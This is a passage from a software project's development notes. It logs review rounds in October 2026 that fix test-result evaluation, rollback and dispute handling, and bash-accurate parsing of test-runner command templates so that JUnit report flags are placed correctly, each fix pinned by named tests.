  rounds** (`test_an_errored_round_is_saved_and_the_round_before_still_counts`,
  `test_a_recorded_rollback_runs_no_further_round`); the reused evaluation
  path drops its install memo (`test_each_evaluation_installs_into_its_fresh_worktree`).

### Review round 5 fixes (2026-10-05)

11 distinct reversions run 12 times (one edit against two tests), 12 caught;
the `.cache` pin was reverted separately afterwards and caught too.

- **A failed install is no evidence** (`test_a_failed_install_is_no_evidence`,
  `test_a_failed_install_in_the_writer_discards_the_set`,
  `test_ensure_worktree_deps_reports_failure`): exit-code verdicts cannot tell
  a missing dependency from a failing fix.
- **A set that cannot be placed is no evidence, and the rollback still runs**
  (`test_a_set_that_cannot_be_placed_is_no_evidence`,
  `test_a_red_repair_rolls_back_even_when_evaluation_breaks`).
- **A round that commits then errors is measured again**
  (`test_a_round_that_commits_then_errors_is_measured_again`).
- **"Ran no test" is no verdict** — narrowed in round 6 to exclude pytest's
  exit 2 (`test_a_file_that_ran_no_test_is_no_verdict`,
  `test_no_verdict_exits_are_matched_on_command_tokens`); fork exhaustion is
  none either and a timeout fails (`test_a_fork_exhaustion_kill_is_no_verdict`,
  `test_a_timeout_fails`).
- **Paths normalised** (`test_dot_slash_declared_paths_are_not_also_support_files`,
  now `a/./b` too); **ignored files travel only beside a test**
  (`test_ignored_build_output_elsewhere_does_not_travel`,
  `test_a_gitignored_helper_still_travels`); `.cache` is not a by-product
  (`test_cache_and_provision_paths`).

### Review round 6 fixes (2026-10-05)

6 distinct reversions run 7 times, 7 caught (the `round_start` pin only after
its test made both HEAD reads unreadable).

- **pytest's collection error is evidence**
  (`test_an_unimportable_module_under_test_is_a_failure`: a fix that broke the
  module). The "import-time defect at the base" half was undone in round 7,
  which discards such a set while validating (fail-open).
- **A failing build step is not a failed install**
  (`test_only_a_failed_install_counts`, renamed in round 7 and widened to
  timeouts and raised errors).
- **Evaluation never raises** (`test_an_evaluation_that_cannot_be_set_up_is_no_evidence`,
  `test_a_red_repair_rolls_back_when_evaluation_cannot_be_set_up`).
- **An unmeasurable final keeps the last measured residual**
  (`test_an_unmeasurable_final_keeps_the_last_measured_residual`), and an
  unreadable HEAD counts as moved (pinned since the post-merge fix by
  `test_two_unreadable_heads_still_count_as_moved`).

### Review round 7 fixes (2026-10-05)

13 distinct reversions run 14 times (one edit against two tests), 14 caught —
the two test-axis measurement guards only after
`test_a_test_axis_measurement_that_raises_never_escapes` was added for them.

- **Runner "ran no test" exits only while validating**
  (`test_a_file_that_ran_no_test_is_no_verdict` — no verdict validating, a
  failure evaluating; `test_a_writer_file_broken_in_itself_discards_the_set`;
  `test_a_broken_module_a_conftest_imports_is_a_failure` — pytest's exit 4;
  `test_an_unimportable_module_under_test_is_a_failure`). Round 6 had dropped
  exit 2 entirely, reopening the broken-test-file case round 5 had closed.
- **Nothing reading HEAD can raise past the rollback**
  (`test_branch_head_sha_never_raises`,
  `test_a_fork_failure_reading_head_after_a_repair_still_rolls_back`).
- **A repair that makes the sets unmeasurable is rolled back** — since round
  8, only after a retry of the repaired tree and a pre-repair control
  (`test_a_repair_that_breaks_the_install_is_rolled_back`); **a failed reset is
  recorded, not assumed** (`test_a_failed_reset_is_recorded_not_assumed`); **no
  rollback target, no repair** (`test_no_rollback_target_means_no_repair`).
- **Build failures of every shape are evidence; install failures are not**
  (`test_only_a_failed_install_counts`, 6 cases). `unmeasured_final` reaches the
  planner (`test_residual_reaches_the_next_runs_planner_ctx`).

### Review round 8 fixes (2026-10-05)

7 distinct reversions, each against its named test, 7 caught.

- **A one-off install failure keeps a correct repair**
  (`test_a_one_off_install_failure_keeps_a_correct_repair`,
  `test_a_lasting_environment_failure_keeps_the_repair`): the repaired tree is
  measured again, and the pre-repair tree is the control, before the
  unmeasurable-sets rule rolls anything back.
- **Any failure spawning a later round still reaches the rollback**
  (`test_a_failure_spawning_a_later_round_still_rolls_back`).
- **A failed reset leaves the repair tree's verdict**, and an unreadable HEAD
  after a reset is read again (`test_a_failed_reset_is_recorded_not_assumed`,
  `test_an_unreadable_head_after_a_reset_is_read_again`).

### Review round 9 fixes (2026-10-05)

4 distinct reversions, each against its named test, 4 caught.

- **A failed rollback reaches the next run**
  (`test_an_unmeasurable_repair_whose_reset_fails_says_so`,
  `test_a_failed_reset_is_recorded_not_assumed`): `rollback_failed` rides the
  residual — created if the sets pass — and `_prior_delivery_residual`
  forwards it; `unmeasured_final` no longer claims to mean only an
  environment failure.
- **The reset itself is retried** (`test_a_reset_that_cannot_spawn_is_tried_again`).
- **A measured retry replaces the round's record**
  (`test_a_one_off_install_failure_keeps_a_correct_repair`).

### Post-merge review fixes (2026-10-05)

Both reversions caught: restoring the HEAD-at-round-start comparison, and
dropping the both-unreadable clause.

- **A resumed round after a lost commit is measured again**
  (`test_a_resumed_round_after_a_lost_commit_is_measured_again`): every
  verdict now records the commit it was measured on (`initial_sha`,
  `rounds[].sha`), and an errored round compares HEAD against that, not
  against HEAD at the round's start — which, after an interrupted attempt,
  already held the lost commit.
- **Two unreadable HEADs still count as moved**
  (`test_two_unreadable_heads_still_count_as_moved`, replacing
  `test_an_unreadable_round_start_still_measures_a_committing_error`, whose
  read order no longer exists).
- `test_each_evaluation_installs_into_its_fresh_worktree`'s spy now returns the
  install's verdict, and the test asserts both evaluations measured.

### Runner reports, writer-declared import defects, in-loop retry (2026-10-05)

The first commit's 12 distinct reversions, each against its named test, all
caught — they cover the report, import-defect and retry entries below.
Later entries record their own falsification where one was run.

- **Structured runner reports while validating**
  (`test_runner_reports_are_read_mechanically`: JUnit and jest-compatible JSON,
  pass / no tests / skipped only / collection error / setup error / unreadable;
  `test_report_flags_are_placed_only_where_they_reach_the_runner`;
  `test_pytest_is_asked_for_junit_through_its_environment`). A file whose
  tests all skip exits 0, so only the report shows it ran nothing
  (`test_a_file_whose_tests_all_skip_is_no_verdict_while_validating`).
- **Writer-declared import defects** (`test_a_declared_import_defect_counts_as_failing`,
  `test_an_import_defect_set_validates_and_passes_on_the_fix`).
- **An import declaration is honoured only where parsing is checked
  reliably** — Python only. First pinned by an in-process compile test,
  since replaced by the project-interpreter probe (see the next subsection).
  The writer prompt's JSON example is checked against the schema
  (`test_the_writer_prompt_example_matches_the_schema`). A non-Python file
  declared an import defect is dropped alone, not with its whole set
  (`test_an_unhonourable_import_declaration_drops_only_its_file`; reverting
  the drop turns it red).
- **Retry inside the repair loop**
  (`test_a_one_off_install_failure_mid_loop_keeps_the_next_round`), and the
  post-loop retry skipped for a commit already retried
  (`test_a_commit_already_retried_in_the_loop_is_not_retried_again`).

### The parse probe, the collection-error signal, modes in the repair prompt (2026-10-05)

6 distinct reversions run 7 times (one edit against two tests); 5 caught. The
survivor — not deleting the probe file — is an equivalent mutant: the writer's
new files are snapshotted before the probe exists, and its worktree is
discarded after validation, so nothing ever reads the leftover. The deletion
is kept for hygiene.

- **pytest's fixed "collection failure" message marks a load failure**,
  whatever `--junit-prefix` does to the classname
  (`test_runner_reports_are_read_mechanically`, prefixed sample;
  `test_a_junit_prefix_does_not_turn_a_load_failure_into_a_run`, real pytest).
- **The import-declaration parse check runs under the project's own
  interpreter and covers the writer's helpers**
  (`test_an_import_declaration_over_unparseable_writer_files_is_not_honoured`:
  the test file, then a helper beside it;
  `test_the_parse_check_runs_under_the_projects_own_interpreter`;
  `test_the_parse_probe_leaves_nothing_in_the_set`).
- **The repair prompt names import-mode cases apart**
  (`test_import_cases_are_named_as_import_failures_in_the_repair_section`).
- **The probe follows the repository's own test-file naming**, and a probe
  that cannot run is logged apart from one that finds a parse error
  (`test_the_parse_probe_follows_a_repos_own_test_naming`, real pytest on a
  `*_test.py` repo; `test_the_probe_name_matches_the_declared_files_convention`;
  `test_an_unrunnable_probe_is_reported_as_such`). 3 reversions, 3 caught.
- **The probe's last edges**: a declared name too long to extend
  (`test_a_long_declared_name_still_gets_a_probe_name`), a probe the template
  deselects reported as unrunnable rather than unparseable
  (`test_a_probe_the_template_deselects_is_unrunnable_not_unparseable`), and a
  `{files}` template running the probe whatever its name
  (`test_a_files_template_runs_the_probe_whatever_its_name`). 3 reversions, 3
  caught.
- **The probe judges parsing only when its body ran**: a marker it writes
  first separates "a target does not compile" (False,
  `test_a_target_that_does_not_compile_is_a_parse_failure`) from "the runner
  failed before reaching it" — a broken conftest, a conftest importing the
  missing entry point, an unknown plugin flag (None, with the exit code;
  `test_a_probe_that_never_reaches_its_check_says_so`). It replaces an
  exit-code mapping that labelled pytest's 2/3/4 as parse failures.
- **…and only when it ran to the end**: the marker records "ran" then "ok", so
  a teardown error after a passing check, a probe the repository skips (exit
  0, no marker), and a runner that does not exist (127) each read as what they
  are (`test_a_probe_failure_that_is_not_about_parsing_says_what_it_was`).
  An unwritable marker directory is named as such
  (`test_an_unwritable_marker_directory_is_named_as_such`), and a probe the
  template deselects reads "collected or selected no test (exit 5)"
  (`test_a_probe_the_template_deselects_is_unrunnable_not_unparseable`).
- **The repair prompt's import line states only what validation saw**: a
  declared import defect whose file loaded on the base and failed an
  assertion is recorded `"assertion"`
  (`test_a_declared_import_defect_that_loaded_is_recorded_as_an_assertion`),
  and the line describes the UNFIXED tree
  (`test_import_cases_are_named_as_import_failures_in_the_repair_section`).
  Report flags are never placed when the runner also appears before a
  separator (`test_report_flags_are_placed_only_where_they_reach_the_runner`).

`tests/test_resolve_skip_acceptance_check.py` pins the flag's resolution order
(CLI → env → leerie.toml → off), mirroring its sibling resolvers.

### A dispute counts only once it is acted on (2026-10-06)

Post-merge review of #282 found a disputing run could still end as no work by
another exit (empty plans, or the satisfied-probe sweep dropping every
subtask), and the next run then accepted "no work" on a dispute nobody acted
on. Seven reversions of the fix, each caught by at least one test below:

- **Protect**
  (`tests/test_filter_satisfied_subtasks.py::test_protected_subtask_is_never_probed_or_dropped`):
  a protected subtask is never handed to the probe, even when the probe would
  call everything satisfied, and the plan is not emptied.
- **When to protect** (`test_pre_sweep_protect`, six cases;
  `test_pre_sweep_protect_errors_protect_nothing`,
  `test_pre_sweep_protect_skipped_with_the_sweep`): a measured failing
  majority protects, a tie included; passing, no sets, nothing measured, no
  fix subtasks and `skip_satisfied_check` (both of which also skip running
  the sets) and any error protect nothing.
- **The reviewer's scenario end to end**
  (`test_dispute_then_probe_drops_everything_keeps_the_fix`): a dispute, then a
  sweep whose probe says "satisfied" to everything, keeps the fix subtask and
  fires neither the sweep's nor A4's no-work exit.
- **Unacted** (`test_mark_dispute_unacted`, three cases;
  `test_an_unacted_dispute_does_not_count`): this run's own dispute is marked
  and persisted, a carried-forward acceptance is not, and the lookup ignores an
  unacted dispute.
- **Wiring** (`test_run_phases_wiring`,
  `test_both_other_no_work_exits_mark_the_dispute_unacted`): source-order
  pins that the protect set is computed before the sweep and passed to it,
  and that each of the two other no-work exits marks the dispute first. The
  behaviour of each helper is pinned by the tests above.

#### Review round 1 fixes (2026-10-06)

The first review of #283 found that an unacted dispute was re-raised on every
run when the held-out tests themselves are wrong: the planners, shown the
failing cases, correctly return nothing, the dispute goes unacted, and the
next run disputes again — the loop the at-most-once rule exists to prevent. A
re-dispute raised past an unacted one is now marked `redispute`, and counts
even if it too goes unacted
(`test_a_wrong_dispute_that_goes_unacted_is_bounded`, three runs' state;
`test_a_first_dispute_is_not_a_redispute`). The tie case and the skip flag
gained the cases named above. Five reversions (the `redispute` write, counting
it, the skip flag, a strict-majority rule in place of
`_acceptance_majority_fails`, and counting unacted disputes) are each caught
by at least one test.

#### The open #282 LOWs (2026-10-06)

- **Held-back names stay held back at the settle**
  (`test_dispute_evidence_names_only_shown_sets`, two cases;
  `test_dispute_with_only_hidden_failures_gives_counts_alone`): the dispute
  evidence reaches the planners, so it names only `_acceptance_shown_indices`
  sets, and gives counts alone when only held-back sets fail
  (`test_shown_indices_hold_back_the_two_highest_from_four` pins the split).
- **No empty promise to the repair**
  (`test_a_section_with_only_hidden_failures_promises_no_names`): when only
  held-back sets fail, the section says every failing test is unseen
  rather than "the failing cases are named below".
- **A template naming its own JUnit path**
  (`test_a_command_naming_its_own_junit_path_gets_ours_appended`, three
  cases; `test_an_appended_junit_path_is_the_report_pytest_writes`, which
  runs pytest and reads the report back): the command's own `--junitxml`
  beat the `PYTEST_ADDOPTS` request, so validation silently had no report;
  ours is now appended after it where it reaches the runner.
- **A first run skips the foregone pre-sweep evaluation**
  (`test_pre_sweep_protect_on_the_validity_base_skips_the_run`, two cases).

Seven reversions, each caught by at least one test: the shown filter on the
dispute names, the counts-only evidence, the hidden-only section header, the
validity-base shortcut, detecting the command's own JUnit option, the
held-back split itself, and the placement check on the appended option.

#### Follow-up: the final #283 review's LOWs (2026-10-06)

- **An appended option past `--` or `)`**
  (`test_a_command_naming_its_own_junit_path_gets_ours_appended`, now six
  cases; `test_report_flags_are_placed_only_where_they_reach_the_runner`, now
  ten — each with a wrapper form whose `--` precedes the runner proper, which
  must still place): #283 appended `--junitxml=<path>` after a template's own,
  which after `--` is a file argument and after `)` a syntax error — a working
  template became a discarded set. `_flags_reach_runner` now refuses both,
  which means no report, as before #283.
- **A failing shown set that named no cases**
  (`test_a_shown_set_naming_no_cases_is_not_called_hidden`,
  `test_unnamed_shown_failures_are_not_called_held_back`): neither the repair
  section nor the dispute evidence calls it held back; and a shown set with no
  verdict is not such a failure
  (`test_an_unmeasured_shown_set_is_not_a_failure_without_names`).
- **The accepted-after-dispute WARNING**
  (`test_accepted_warning_never_ends_in_an_empty_case_list`).
- **No second worktree reset on the first-run shortcut**
  (`test_pre_sweep_protect_on_the_validity_base_skips_the_run` counts
  `_ensure_planning_worktree` calls).

Seven reversions, each caught by at least one test: dropping the `)`/`--`
check, keeping only `)`, keeping only `--`, the unnamed-shown section branch,
the evidence's not-named reason, the WARNING's empty list, and the
re-added worktree reset.

#### Post-merge review of #283 and #284 (2026-10-06)

- **Placement** (`test_report_flags_are_placed_only_where_they_reach_the_runner`
  and `test_a_command_naming_its_own_junit_path_gets_ours_appended` gained
  `$(…)`, grouped-operator and container cases;
  `test_a_file_named_like_the_runner_is_never_the_runner`, two cases;
  `test_a_containerised_pytest_gets_no_environment_request_either`;
  `test_a_file_named_like_a_runner_does_not_borrow_its_exit_codes`): a
  `$(…)` among the runner's arguments no longer stops placement (#284 had
  made `--maxWorkers=$(nproc)` lose jest's report); a `)` stops it only when
  it closes a subshell the runner runs in; operator characters `shlex`
  groups (`))`, `)&&`) are read one at a time; the rendered file is never a
  runner token; and a runner started through a container CLI gets no
  report request (an appended path it cannot create failed a passing run).
- **Mixed named and unnamed failures**
  (`test_mixed_named_and_unnamed_failures_say_the_list_is_partial`,
  `test_dispute_evidence_says_when_names_are_partial`).
- **The planner's reading of acceptance evidence**
  (`test_the_planner_prompt_names_the_evidence_prefix_the_settle_writes`):
  `prompts/planner.md` tells planners how to read counts-only evidence by
  its opening words; the test pins that the settle still writes them.
- **One evaluation per commit**
  (`test_head_results_are_measured_once_per_commit`): the settle, the
  pre-sweep check and the already-fixed check share one measurement; one that
  measured nothing is not kept.

Ten reversions, each caught by at least one test: the file exclusion in
placement and in runner detection, the paren depth, the character-wise
operator scan, the `--` stop, the container check, the mixed-name note in
the section and in the evidence, the cache read, and the rule never to
cache a measurement that measured nothing.

##### Review round 1 of the post-merge fixes (2026-10-06)

- **Container check scoped to the runner's own command**
  (`test_report_flags_are_placed_only_where_they_reach_the_runner` gained
  `docker compose up -d db && npx jest …` and `--rootDir docker`, both
  placed; `test_a_containerised_pytest_gets_no_environment_request_either`
  now also asserts a host pytest after `docker compose up` keeps its
  environment request). The first version matched `docker` anywhere and
  cost a common start-the-database template its report.
- **Files compared normalised**
  (`test_a_file_named_like_the_runner_is_never_the_runner` gained
  `./t/jest`).
- **Operator characters read one at a time, really**: a `))` closing a
  `$(…)` and the runner's subshell at once (the earlier grouped cases sat at
  depth 0, where a whole-token reading also refused, so that reversion
  passed).
- **The mixed-name note follows every name**, the import list included
  (`test_mixed_named_and_unnamed_failures_say_the_list_is_partial`).
- **The accept message names the bound, not "one dispute"**
  (`test_a_second_failing_run_accepts_no_work`).
- **A fresh `_HEAD_ACCEPTANCE_RESULTS` per test** (`tests/conftest.py`'s
  autouse `_fresh_head_acceptance_results`): the `leerie` module is
  session-scoped.

Five reversions, each caught: the container check over the whole command,
raw-token file comparison, a whole-token operator reading, the note before
the import list, and the old accept message.

##### Review round 2 of the post-merge fixes (2026-10-06)

- **The container check per runner occurrence, from the separator before
  it** (`test_only_a_container_that_starts_the_runner_withholds_the_report`,
  seven cases): round 1 sliced from the command's LAST separator, so a
  runner in a container followed by `&& docker compose down`, `| tee` or
  `|| true` was missed; a later containerised occurrence after a host
  `pytest --version` was missed; `docker-compose` (v1) was unknown; and a
  `$(docker port db)` computing a value counted as starting the runner.
  The `)&&` case pins that grouped operator tokens still separate.
- **A newline ends a command** (`test_a_newline_ends_the_runner_command`);
  a trailing one is stripped.
- **Runner detection reads operators as placement does**
  (`test_runner_detection_reads_operators_as_the_shell_does`, three cases):
  `(pytest x)` and `cd w&&pytest x` used to find no runner.

Eight reversions, each caught: slicing from the last separator, checking
only the first occurrence, counting a container inside `$(…)`, dropping
`docker-compose`, lexing newlines as whitespace, not stripping the trailing
newline, plain `shlex.split` for runner detection, and not reading grouped
separators.

##### Review round 3 of the post-merge fixes (2026-10-06)

- **The command is read as bash reads it** (`_shell_unfold`, replaced in round
  6 by `_shell_scan`):
  `test_continuations_and_comments_are_read_as_bash_reads_them` (four cases)
  and the container cases for multi-line `docker run \`/`docker compose run \`
  templates pin that a backslash-newline joins lines (shlex had made it a
  newline token, which round 2 then read as a separator), a trailing comment
  does not swallow appended flags, and a comment does not swallow the newline
  after it. `test_unfolding_does_not_change_what_bash_runs` (replaced in round
  6) (seven cases) runs each raw and unfolded command through real bash.
- **A `#` inside a word is not a comment** (the `uvx --from …#subdirectory`
  case in `test_runner_detection_reads_operators_as_the_shell_does`, whose
  three other cases now each fail under plain `shlex.split`), and a runner
  named only in a comment is not detected
  (`test_a_file_named_like_a_runner_does_not_borrow_its_exit_codes`).
- **A separator inside a `$(…)`** ends the substitution's command only, both
  for a container CLI inside it and one before it.

Seven reversions, each caught: tokenising the raw command, keeping
continuations, a comment at any `#`, shlex's default commenters, separators
inside `$(…)` ending the runner's command, appending to the raw command,
and ignoring single quotes.

##### Review round 4 of the post-merge fixes (2026-10-06)

- **What runs is the template as written, flags appended**
  (`test_continuations_and_comments_are_read_as_bash_reads_them`, now
  seven cases, asserts the exact command): round 3 ran the unfolded
  rewrite, so any reading that differed from bash — a heredoc body's `#`
  lines, a backslash-newline in a quoted heredoc — changed what ran.
  Placement now also needs the appended word to lex as the last word of
  the same command, and never enters a command with a heredoc.
- **`_shell_unfold` closer to bash**
  (`test_unfolding_does_not_change_what_bash_runs` (replaced in round 6), now
  fourteen cases): a `#` after a substitution's `)` is mid-word and after a
  subshell's starts a comment; `$'…'` takes backslash escapes; a CR is a word
  character; `${x#y}`, `$#` and `$((16#ff))` are untouched.
- **Backtick substitutions in the container check**
  (`test_only_a_container_that_starts_the_runner_withholds_the_report`,
  now thirteen cases).

Seven reversions, each caught: running the unfolded form, dropping the
appended-word check, dropping the heredoc check, a substitution's `)`
read as an operator, a CR read as whitespace, no `$'…'` quoting, and no
backtick tracking.

##### Review round 5 of the post-merge fixes (2026-10-06)

- **Placement refuses what the token scan cannot see into**
  (`test_continuations_and_comments_are_read_as_bash_reads_them`, now
  thirteen cases): a backtick after the runner, a quoted `$(…)` hiding that
  the runner runs inside it, a runner handed to `sh -c` as text, and a
  heredoc `<<` grouped with another operator (`(cat)<<EOF`). A trailing
  line continuation is dropped rather than refused.
- **The flags arrive as the runner's last arguments**
  (`test_placed_flags_arrive_as_the_runners_last_arguments`, seven cases):
  each placed command runs through real bash with `jest` defined to print
  its arguments. Two cases have an earlier occurrence of the runner inside a
  `$(…)` or backticks, which must not stop placement.
- **A CR stays in its word**
  (`test_a_carriage_return_is_part_of_a_word_as_in_bash`), and `_shell_unfold`
  handles `${…}` and `<(…)` (`test_unfolding_does_not_change_what_bash_runs`
  (replaced in round 6), now sixteen cases).

Nine reversions, each caught: dropping the backtick-after check, widening
it to any backtick, splitting words on CR, dropping the quoted-`$(…)` check,
dropping the `-c` check, matching only a bare `<<`, keeping a trailing
continuation, ignoring `${…}`, and treating `<(` as a subshell.

##### Review round 6 of the post-merge fixes (2026-10-06)

Round 6 found that the rules layered on `shlex` could not be made right:
`shlex` drops the quotes that tell a quoted `"("` from a subshell's paren,
so `(npx jest -t "(" x)` and `X=$(npx jest -t "(" x)` placed flags where
they broke the command or reached `echo`. `_shell_scan` replaces `shlex`,
`_shell_unfold` and the rules over them: it splits a command into words and
operators as bash does, keeping quoting in mind and recording how deep in
command substitutions each token sits, and the placement rules become plain
statements over those tokens.

- **Scanner against bash** (`test_scanned_words_are_the_words_bash_passes`,
  twelve cases, exact argv; `test_expanding_words_split_where_bash_splits_them`,
  nine cases, word boundaries; `test_expansions_keep_their_words_whole`, two
  cases; `test_a_subshell_paren_is_an_operator_and_a_comment_may_follow`;
  `test_a_carriage_return_is_part_of_a_word_as_in_bash`).
- **Placement** (`test_continuations_and_comments_are_read_as_bash_reads_them`,
  `test_placed_flags_arrive_as_the_runners_last_arguments` and the
  container and detection tests, unchanged in intent): a quoted paren, a
  runner inside a substitution and `sh -xc jest` are refused; a backtick
  among the runner's arguments (`--maxWorkers=`nproc``) and a quoted
  substitution there (`-t "$(echo "a b")"`) place again. (Round 7 found
  no test held `sh -xc jest` or the two placements; they are pinned from
  round 7 on.)
- **Fuzzing, not committed as tests:** 40,000 random inputs scanned with no
  exception or hang; and of 20,000 random valid templates with the runner
  in command position, all 4,739 that were placed delivered the flags as
  the runner's last two arguments under real bash.

Fourteen reversions, each caught: placing at any depth, refusing only
separators, dropping the `--` check, dropping the shell check, no comments,
no continuations, no backtick frames, ignoring heredocs, dropping the probe
check, container CLIs at any depth, no `${…}` frames, unquoted handling
inside double quotes, no `$'…'`, and no `<(…)` frames.

##### Review round 7 of the post-merge fixes (2026-10-06)

- **Escaped quotes and braces inside `${…}`**: in
  `T=a; npx jest ${T//\'/} && cd …` the scan opened a quote at `\'`, so
  flags went to `cd`. A case in
  `test_continuations_and_comments_are_read_as_bash_reads_them` pins it.
  That test also gained a `|<<` heredoc run, `eval jest \;` (new this
  round), and the shapes round 6 claimed but did not test: `sh -xc jest`,
  `--maxWorkers=`nproc`` and `-t "$(echo "a b")"`.
- **`eval`** joins `_SHELLS`: it re-parses appended flags as a command.
- **Runner detection survives a scan that cannot close**
  (`test_runner_detection_reads_operators_as_the_shell_does` gained an
  unparenthesised `case` inside `$(…)`): exit codes still apply.
- **A trailing CR stays in the command that runs**
  (`test_a_trailing_carriage_return_stays_in_the_command_that_runs`).

Seven reversions, each caught: no `${…}` escapes, no `eval`, no fallback
detection, stripping a trailing CR, the old exact `-c` check, a backtick
after the runner refusing placement, and matching only a bare `<<`.

##### Review round 8 of the post-merge fixes (2026-10-06)

- **A redirect ends no command** (`_is_control_op`): `docker compose run
  web 2>&1 npx jest …` had `2>&1` taken for the end of the container's
  command, so the containerised jest got the flags; `sh 2>/dev/null -c
  jest` and `eval >o jest x` hid the shell and `eval` the same way. Cases
  in `test_only_a_container_that_starts_the_runner_withholds_the_report`
  and `test_continuations_and_comments_are_read_as_bash_reads_them` pin
  both, with a redirect in an earlier command still placing.
- **`source` and `.`** join `_SHELLS`; a shell anywhere before the runner
  in its command is refused (`timeout 60 sh -c jest`).
- **The scan against bash, for what round 7 changed and more**
  (`test_expanding_words_split_where_bash_splits_them` gained escaped
  `}`, `'` and `"` inside `${…}` and a comment inside backticks, which
  ends at the backtick; `test_scanned_words_are_the_words_bash_passes`
  gained `$"…"` and a lone trailing backslash, which bash keeps).
- **The detection fallback drops comments**
  (`test_runner_detection_reads_operators_as_the_shell_does`: a runner
  named only in a comment after an unclosable `case` is not detected).

Six reversions, each caught: a redirect ending the command, no `source`
or `.`, a fallback that keeps comments, `$"…"` keeping its `$`, a
backtick comment running to the newline, and no `${…}` escapes.


#### Edge cases in reading test commands, after 0.37.0 (2026-10-06)

The ninth review of #285's last commit (which merged as 97aa2b2 and
shipped in 0.37.0) and fuzzing against real bash left these, fixed here:

- **`>|` is a redirect** (`_split_shell_ops`): a `|` test per character
  read it as a pipe, so `docker run img >|out npx jest …` and
  `sh >|o -c jest` hid the container CLI and the shell. Operator runs now
  split into bash's operators longest first. Cases in
  `test_only_a_container_that_starts_the_runner_withholds_the_report` and
  `test_continuations_and_comments_are_read_as_bash_reads_them`, with
  `ls ;>o npx jest …` still placing.
- **`eval`, `source` and `.` only as the command word**
  (`_takes_runner_as_text`): a bare `.` argument (`npx --prefix . jest`)
  no longer refuses placement; `FOO=1 . run.sh jest` still does.
- **Backtick bodies read as bash reads them**: the body up to the closing
  backtick, its backslash before `$`, `` ` ``, `\` (and `"` in double
  quotes) removed, scanned as a command of its own. `` `echo a\\";` `` was
  the one command of 6,104 valid fuzzed ones the scan rejected; after the
  change none of 14,315 (three seeds) is. A case in
  `test_expanding_words_split_where_bash_splits_them` pins it.
- **`$'…'` decodes like bash** (`_ansi_c_escape`; seven cases in
  `test_scanned_words_are_the_words_bash_passes`).
- **The detection fallback keeps a mid-word `#`**
  (`test_runner_detection_reads_operators_as_the_shell_does`).
- **Word boundaries from syntax alone**: `_bash_argv` sets `IFS=` and
  `set -f`, so bash no longer splits an unquoted expansion's result — which
  the scan cannot know — and the escaped-`}` case now fails without the
  `${…}` escape fix (`"${U:-x\} y} c"`).

Seven reversions, each caught: no backslash removal in backtick bodies,
the old per-character control test, builtins anywhere, a fallback with
`shlex`'s comments, keeping `$'…'` escapes verbatim, no `${…}` escapes,
and a heredoc only as a bare `<<`.

##### Review round 1 of the edge-case fixes (2026-10-07)

- **The command word is found as bash finds it** (`_command_word`): the
  first version took a redirect's target (`>o eval jest \;`), an fd number
  (`2>/dev/null eval …`) or a prefix (`!`, `time -p`, `command`,
  `builtin`) for the command, so `eval`, `source` and `.` hid behind them
  again — 140 of 2,934 fuzzed placements sent flags to `eval` or a sourced
  script. `_ASSIGNMENT_RE` now also matches `NAME+=` and `NAME[i]=`. Nine
  cases in `test_continuations_and_comments_are_read_as_bash_reads_them`.
- **`\c` spans what bash spans** (`$'\c'`, `$'\c\\'`, `$'\c\''`,
  `$'\c?'` in `test_scanned_words_are_the_words_bash_passes`), and `\U`
  beyond Unicode no longer raises
  (`test_expanding_words_split_where_bash_splits_them`, which also gained
  `$${`, read as the PID parameter).
- **A quoted `'#x'` is not a comment in the detection fallback**
  (`test_runner_detection_reads_operators_as_the_shell_does`).

Eleven reversions, each caught: no redirect-target skip, no fd skip, no
prefixes, no `time -p`, the old assignment pattern, `$'\c'` consuming the
quote, no `\c\` case, `\c?` as 0x1f, `chr` beyond Unicode, `$$` as `$`
then `${`, and a fallback that drops quotes.

Fuzz, not committed: 15,000 templates with shells, `eval`, `source`, `.`,
containers and wrappers behind random redirects, assignments and
prefixes; of the 5,880 placed, none put the flags into `eval`, a sourced
script, a shell or a container stub under real bash.

##### Review round 2 of the edge-case fixes (2026-10-07)

- **Four shapes the command-word finder still missed** — a separator and
  a redirect fused in one operator run (`true;>o eval jest \;`, where the
  command now starts at the run, `_ends_in_redirect`), a `{fd}>x`
  redirect (`_FD_WORD_RE`), prefix options (`command -p`, `time -p --`,
  `builtin --`) and `coproc`. Seven cases in
  `test_continuations_and_comments_are_read_as_bash_reads_them`, one of
  them a fused run that still places.
- **The detection fallback** (`_first_comment`, replaced in round 3 by
  `_strip_comments`) cuts at the first comment
  found by a quote-aware pass, then splits POSIX-style: round 1's
  `posix=False` split a quoted word at its spaces (`-run='Foo pytest'`
  named pytest) and read a quoted `#` as a comment. Two cases in
  `test_runner_detection_reads_operators_as_the_shell_does`.

Six reversions, each caught: no fused-run start, no `{fd}`, no prefix
options, no `coproc`, the `posix=False` fallback, and a comment finder
blind to quotes.

##### Review round 3 of the edge-case fixes (2026-10-07)

- **A comment ends at its newline in the detection fallback too**
  (`_strip_comments`, which replaces round 2's `_first_comment`): round 1
  and 2 cut the command from the first comment to its end, so a runner on
  a later line was lost. The pass also tracks `$'…'`, `${…}`, backticks
  and substitution parens, so `$(echo u)#sub` and `${A:-a #b}` hide
  nothing; `_rough_words` replaces `shlex.split` there, which fails on
  `$'…'`. Six cases in
  `test_runner_detection_reads_operators_as_the_shell_does`.
- **A command word an expansion builds** (`$E jest`, `$(echo eval) jest`)
  is treated as a builtin that takes the runner as text: it may be one.
- **More shells and container CLIs**: `ash`, `mksh`, `yash`, `fish`,
  `csh`, `tcsh`; `finch`, `ctr`, `buildah`, `apptainer`, `singularity`.
  Four cases across the placement and container tests (the two
  expansion-word cases above make six).

Eight reversions, each caught: a comment to the end of the command, a
substitution's `)` as an operator, `${…}` ignored, `$'…'` ignored,
expansion command words allowed, the old shell list, the old container
list, and `shlex.split` in the fallback. Two more pieces of the first
draft (a second `${…}` check and a backtick boundary) survived their
reversions as redundant and were dropped.

##### Review round 4 of the edge-case fixes (2026-10-07)

- **A backtick in a comment is part of the comment**: `_strip_comments`
  now knows whether it is inside a backtick body, and only there does a
  backtick end a comment. Round 3's version stopped at any backtick, so
  `# see `foo`, don't` opened a quote that hid the next line's runner
  (a regression against main). It also reads `$$` as the PID and keeps
  the word boundary across a line continuation; `_rough_words` reads `$$`
  too. Five cases in `test_runner_detection_reads_operators_as_the_shell_does`.
- **The expansion rule narrowed** (`_may_expand_to_builtin`): a `/` outside
  `${…}`, `$(…)` and backticks means no builtin lookup, so
  `$VENV/bin/python -m pytest --junitxml=…` places again; `$NPX jest` and
  `$PYTHON -m pytest --junitxml=…` are still refused, at their report's
  cost (cases in `test_a_command_naming_its_own_junit_path_gets_ours_appended`
